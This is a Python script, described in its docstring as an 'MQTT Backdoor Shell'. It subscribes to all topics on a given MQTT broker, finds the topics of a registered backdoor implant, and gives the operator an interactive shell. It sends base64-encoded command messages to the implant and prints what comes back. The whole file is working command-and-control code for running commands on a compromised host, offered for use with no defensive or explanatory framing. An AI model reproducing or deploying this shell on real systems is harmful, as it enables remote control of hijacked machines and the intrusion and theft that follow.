#!/usr/bin/env python3
"""
MQTT Backdoor Shell — topic autodiscovery via wildcard subscribe
Usage: python3 mqtt_shell.py <BROKER_IP> [--port 1883]
"""
import sys
import json
import base64
import time
import queue
import argparse

try:
    import paho.mqtt.client as mqtt
except ImportError:
    print("[-] pip install paho-mqtt")
    sys.exit(1)

response_queue  = queue.Queue()
discovery_queue = queue.Queue()
pub_topic       = None
sub_topic       = None


def on_connect(client, userdata, *args):
    client.subscribe("#")
    print("[*] Waiting for backdoor registration...")


def on_message(client, userdata, msg):
    global pub_topic, sub_topic

    payload = msg.payload
    if isinstance(payload, (bytes, bytearray)):
        payload = payload.decode(errors="replace")

    try:
        decoded = base64.b64decode(payload).decode(errors="replace")
        data    = json.loads(decoded)
    except Exception:
        try:
            data = json.loads(payload)
        except Exception:
            return

    if "pub_topic" in data and "sub_topic" in data:
        if pub_topic is None:
            pub_topic = data["pub_topic"]
            sub_topic = data["sub_topic"]
            discovery_queue.put(data)
        return

    if "response" in data:
        response_queue.put(data["response"])


def send_cmd(client, cmd, arg, timeout=6):
    while not response_queue.empty():
        try:
            response_queue.get_nowait()
        except queue.Empty:
            break

    payload_b64 = base64.b64encode(
        json.dumps({"id": "1", "cmd": cmd, "arg": arg}).encode()
    ).decode()
    client.publish(sub_topic, payload_b64)

    try:
        return response_queue.get(timeout=timeout)
    except queue.Empty:
        return None


def shell(client):
    print("[+] Shell ready (Ctrl+C to exit)\n")
    while True:
        try:
            line = input("$ ").strip()
            if not line:
                continue
            resp = send_cmd(client, "CMD", line)
            print(resp.rstrip("\n") if resp else "[-] No response (timeout)")
        except KeyboardInterrupt:
            print("\nBye!")
            sys.exit(0)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip")
    parser.add_argument("--port", "-p", type=int, default=1883)
    args = parser.parse_args()

    try:
        client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
    except (AttributeError, TypeError):
        client = mqtt.Client()

    client.on_connect = on_connect
    client.on_message = on_message

    print(f"[*] Connecting to {args.ip}:{args.port}...")
    try:
        client.connect(args.ip, args.port, keepalive=60)
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)

    client.loop_start()
    time.sleep(1.5)

    try:
        reg = discovery_queue.get(timeout=10)
    except queue.Empty:
        print("[-] No registration message received.")
        sys.exit(1)

    print(f"[+] sub_topic: {sub_topic}")
    print(f"[+] pub_topic: {pub_topic}")

    client.subscribe(pub_topic)
    time.sleep(0.5)

    shell(client)


if __name__ == "__main__":
    main()
